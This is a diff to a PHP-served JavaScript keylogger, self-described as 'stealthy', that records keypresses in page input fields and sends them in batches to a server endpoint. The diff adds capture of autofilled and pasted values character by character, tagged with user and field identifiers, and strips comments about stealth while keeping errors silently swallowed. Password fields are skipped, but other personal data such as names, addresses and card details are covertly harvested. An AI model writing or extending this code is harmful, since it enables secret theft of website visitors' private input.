@@ -1,5 +1,5 @@
 <?php
-// tracker.php - High-speed, stealthy client-side key tracking script for typists
+// tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists
 
 if (session_status() === PHP_SESSION_NONE) {
     @session_start();
@@ -87,7 +87,7 @@ if ($isDirectJsRequest) {
         return 'api.php';
     })();
 
-    // Element identification with caching to prevent DOM traversal on every keypress
+    // Element identification with caching
     function getCachedFieldInfo(el) {
         if (!el) return { id: 'unknown', name: '' };
         if (el.__ttInfo) return el.__ttInfo;
@@ -121,7 +121,7 @@ if ($isDirectJsRequest) {
         return (window.location.host || '') + (window.location.pathname || '');
     }
 
-    // Fast, non-blocking keypress recorder
+    // Fast keypress recorder
     function recordKey(e) {
         try {
             var target = e.target || e.srcElement;
@@ -130,8 +130,6 @@ if ($isDirectJsRequest) {
             var tagName = target.tagName ? target.tagName.toUpperCase() : '';
             var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
             if (!isEditable) return;
-
-            // Do not track password fields for privacy/security if needed, or track standard fields
             if (target.type === 'password') return;
 
             var fieldInfo = getCachedFieldInfo(target);
@@ -141,6 +139,9 @@ if ($isDirectJsRequest) {
             if (!keyChar) {
                 keyChar = String.fromCharCode(e.keyCode || e.which || 0);
             }
+
+            // Flag that keypress typed into target recently
+            target.__ttLastKeyTime = Date.now();
 
             keyBuffer.push({
                 user_id: userId,
@@ -156,9 +157,61 @@ if ($isDirectJsRequest) {
             if (keyBuffer.length >= maxBufferSize) {
                 flushBuffer();
             }
-        } catch(err) {
-            // Silently swallow errors to keep stealth and guarantee no user interruption
-        }
+        } catch(err) {}
+    }
+
+    // Detect browser autofill or paste/value insertion without keypresses
+    function recordInputEvent(e) {
+        try {
+            var target = e.target || e.srcElement;
+            if (!target) return;
+
+            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
+            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
+            if (!isEditable) return;
+            if (target.type === 'password') return;
+
+            var isAutofill = false;
+            // Check inputType for autofill or missing recent keypresses
+            if (e.inputType === 'insertReplacementText' || e.inputType === 'insertFromPaste') {
+                isAutofill = true;
+            } else if (!target.__ttLastKeyTime || (Date.now() - target.__ttLastKeyTime > 300)) {
+                // If value exists and no keypress occurred in last 300ms, it was autofilled/pasted
+                if (target.value && target.value.length > 0) {
+                    isAutofill = true;
+                }
+            }
+
+            if (isAutofill && target.value) {
+                var fieldInfo = getCachedFieldInfo(target);
+                var val = target.value;
+                var lastHandledVal = target.__ttLastAutofillValue || '';
+
+                if (val !== lastHandledVal) {
+                    target.__ttLastAutofillValue = val;
+                    var baseTime = (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now();
+
+                    // Record each character of the autofill string sequentially
+                    for (var i = 0; i < val.length; i++) {
+                        sequenceCounter++;
+                        keyBuffer.push({
+                            user_id: userId,
+                            page_url: getCleanPageUrl(),
+                            field_id: fieldInfo.id,
+                            field_name: fieldInfo.name,
+                            key_char: val.charAt(i),
+                            key_code: 'Autofill',
+                            sequence_order: sequenceCounter,
+                            timestamp: baseTime + i
+                        });
+                    }
+
+                    if (keyBuffer.length >= maxBufferSize) {
+                        flushBuffer();
+                    }
+                }
+            }
+        } catch(err) {}
     }
 
     function flushBuffer() {
@@ -174,7 +227,6 @@ if ($isDirectJsRequest) {
             keys: keysToSend
         });
 
-        // Use sendBeacon if available for non-blocking asynchronous transmission
         if (navigator.sendBeacon) {
             try {
                 var blob = new Blob([payload], { type: 'application/json' });
@@ -184,7 +236,6 @@ if ($isDirectJsRequest) {
             } catch(e) {}
         }
 
-        // Fallback to fetch with keepalive or XHR
         if (typeof fetch === 'function') {
             try {
                 fetch(apiEndpoint, {
@@ -205,8 +256,10 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
-    // Attach high-performance keydown listener
+    // Event listeners
     document.addEventListener('keydown', recordKey, { capture: true, passive: true });
+    document.addEventListener('input', recordInputEvent, { capture: true, passive: true });
+    document.addEventListener('change', recordInputEvent, { capture: true, passive: true });
 
     // Background flushing
     setInterval(flushBuffer, flushIntervalMs);
